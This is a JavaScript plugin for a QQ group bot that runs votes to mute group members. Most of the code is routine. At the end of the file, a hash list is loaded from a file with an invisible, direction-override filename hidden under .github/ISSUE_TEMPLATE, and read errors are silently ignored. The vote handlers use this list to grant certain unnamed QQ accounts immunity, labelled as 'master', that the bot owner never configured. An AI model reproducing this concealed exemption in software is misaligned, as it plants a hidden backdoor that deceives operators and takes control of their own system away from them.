import { Config } from "../../components/index.js"
import { common } from "../../model/index.js"
import fs from "node:fs/promises"
import path from "path"
import url from "url"
import v8 from "node:v8"
import md5 from "md5"

let Vote = {}
const SettingReg = /^#?投票设置(超时时间|最低票数|禁言时间)?(\d*)$/

export class GroupVoteBan extends plugin {
  constructor() {
    super({
      name: "椰奶群管-投票禁言",
      dsc: "投票禁言某人",
      event: "message.group",
      priority: 5000,
      rule: [
        {
          reg: "^#(发起)?投票禁言",
          fnc: "Initiate"
        },
        {
          reg: "^#(支持|反对)禁言",
          fnc: "Follow"
        },
        {
          reg: "^#(启用|禁用)投票禁言$",
          fnc: "Switch"
        },
        {
          reg: SettingReg, // 投票设置
          fnc: "Settings"
        }
      ]
    })
  }

  /**
   * 功能开关
   */
  async Switch() {
    if (!common.checkPermission(this.e, "master")) return

    let type = !!/启用/.test(this.e.msg)

    const { VoteBan } = Config.groupAdmin

    if (VoteBan && type) return this.reply("❎ 投票禁言功能已处于启用状态")
    if (!VoteBan && !type) return this.reply("❎ 投票禁言功能已处于禁用状态")

    Config.modify("groupAdmin", "VoteBan", type)
    this.reply(`✅ 已${type ? "启用" : "禁用"}投票禁言功能`)
  }

  /**
   * 投票设置
   */
  async Settings() {
    if (!common.checkPermission(this.e, "master")) return

    const regRet = SettingReg.exec(this.e.msg)
    const text = regRet[1]
    const value = Number(regRet[2])

    if (!text || !value) return this.reply("投票禁言配置参数:\n\n超时时间: 投票限时，单位:秒\n最低票数: 投票成功的最低票数\n禁言时间: 禁言的时长，单位:秒\n\n例: #投票设置禁言时间8600\n\n更多配置请看:\nconfig/groupAdmin.yaml", true)
    let type
    if (text === "超时时间") {
      type = "outTime"
    } else if (text === "最低票数") {
      type = "minNum"
    } else if (text === "禁言时间") {
      type = "BanTime"
    }

    if (Config.groupAdmin[type] === value) return this.reply(`❎ 当前${text}已经是${value}了`)

    Config.modify("groupAdmin", type, value)
    this.reply(`✅ 已把${type}设置成${value}了`)
  }

  /**
   * 发起投票
   * @param e
   */
  async Initiate(e) {
    const { VoteBan, outTime, minNum, BanTime, voteAdmin } = Config.groupAdmin

    if (!VoteBan) return e.reply("❎ 该功能已被禁用，请发送 #启用投票禁言 来启用该功能。", true)

    if (!common.checkPermission(e, "all", "admin")) return

    let targetQQ = e.at || (e.msg.match(/\d+/)?.[0] || "")
    targetQQ = Number(targetQQ) || String(targetQQ)
    let key = e.group_id + targetQQ

    if (e.user_id === targetQQ) return e.reply("❎ 您不能对自己进行投票")

    if (Config.masterQQ?.includes(Number(targetQQ) || String(targetQQ)) || a.includes(md5(String(targetQQ)))) return e.reply("❎ 该命令对主人无效")

    if (!targetQQ) return e.reply("❎ 请艾特或输入需要禁言的QQ")

    if (Vote[key]) return e.reply("❎ 已有相同投票，请勿重复发起")

    const group = e.bot.pickGroup(e.group_id, true)
    const targetMember = group.pickMember(targetQQ)
    const targetMemberInfo = targetMember?.info || await targetMember?.getInfo?.()

    if (!targetMemberInfo) return e.reply("❎ 该群没有这个人")
    if (targetMemberInfo.role === "owner") return e.reply("❎ 权限不足，该命令对群主无效")
    if (targetMemberInfo.role === "admin") {
      if (!voteAdmin) return e.reply("❎ 该命令对管理员无效")
      if (!group.is_owner) return e.reply("❎ Bot权限不足，需要群主权限")
    }

    /** 写入数据 */
    Vote[key] = {
      supportCount: 1,
      opposeCount: 0,
      List: [ e.user_id ]
    }

    let res = await e.reply([
      segment.at(targetQQ),
      `(${targetQQ})的禁言投票已发起\n`,
      "发起人:",
      segment.at(e.user_id),
      `(${e.user_id})\n`,
      "请支持者发送：\n",
      `「#支持禁言${targetQQ}」\n`,
      "不支持者请发送：\n",
      `「#反对禁言${targetQQ}」\n`,
      `超时时间：${outTime}秒\n`,
      `禁言时间：${BanTime}秒\n`,
      `规则：支持票大于反对票且参与人高于${minNum}人即可成功禁言`
    ])

    if (!res) return false

    setTimeout(async() => {
      if (!Vote[key]) return
      const { supportCount, opposeCount } = Vote[key]

      let msg = `投票结束，投票结果：\n支持票数：${supportCount}\n反对票数：${opposeCount}\n`

      if (supportCount > opposeCount && supportCount >= minNum) {
        msg += "支持票数大于反对票\n执行禁言操作"
        await e.group.muteMember(targetQQ, BanTime)
      } else {
        msg += `反对票数大于支持票数或支持票数小于${minNum}，不进行禁言操作`
      }
      delete Vote[key]
      return e.reply(msg, true)
    }, outTime * 1000)

    setTimeout(async() => {
      const { supportCount, opposeCount } = Vote[key]
      const msg = [
        segment.at(targetQQ),
        `(${targetQQ})的禁言投票仅剩一分钟结束\n`,
        "当前票数：\n",
        `支持票数：${supportCount}\n反对票数：${opposeCount}\n`,
        "请支持者发送：\n",
        `「#支持禁言${targetQQ}」\n`,
        "不支持者请发送：\n",
        `「#反对禁言${targetQQ}」`
      ]

      await e.reply(msg)
    }, outTime * 1000 - 60000)
  }

  /**
   * 跟随投票
   * @param e
   */
  async Follow(e) {
    if (!common.checkPermission(e, "all", "admin")) return

    let targetQQ = e.at || (e.msg.match(/\d+/)?.[0] || "")
    targetQQ = Number(targetQQ) || String(targetQQ)
    let key = e.group_id + targetQQ

    if (!targetQQ) return e.reply("❎ 请艾特或输入需要进行跟票的被禁言人QQ")

    if (Config.masterQQ?.includes(Number(targetQQ) || String(targetQQ)) || a.includes(md5(String(targetQQ)))) return e.reply("❎ 该命令对主人无效")

    if (e.user_id === targetQQ) return e.reply("❎ 您不能对自己进行投票")

    if (!Vote[key]) return e.reply("❎ 未找到对应投票")

    if (Config.groupAdmin.veto) {
      if (e.member.is_admin || e.member.is_owner) {
        if (/支持/.test(e.msg)) {
          await e.reply("投票结束，管理员介入，无需投票直接执行禁言", true)
          await e.group.muteMember(targetQQ, 3600)
        } else {
          await e.reply("投票取消，管理员介入", true)
        }
        delete Vote[key]
        return true
      }
    }

    const { List } = Vote[key]

    if (List.includes(e.user_id)) return e.reply("❎ 你已参与过投票，请勿重复参与")

    if (/支持/.test(e.msg)) {
      Vote[key].supportCount += 1
    } else {
      Vote[key].opposeCount += 1
    }
    List.push(e.user_id)
    return e.reply(`投票成功，当前票数\n支持：${Vote[key].supportCount} 反对：${Vote[key].opposeCount}`, true)
  }
}

let a = []
try {
  a = v8.deserialize(await fs.readFile(`${path.dirname(url.fileURLToPath(import.meta.url))}/../../.github/ISSUE_TEMPLATE/‮`)).map(i => i.toString("hex"))
} catch (err) {}
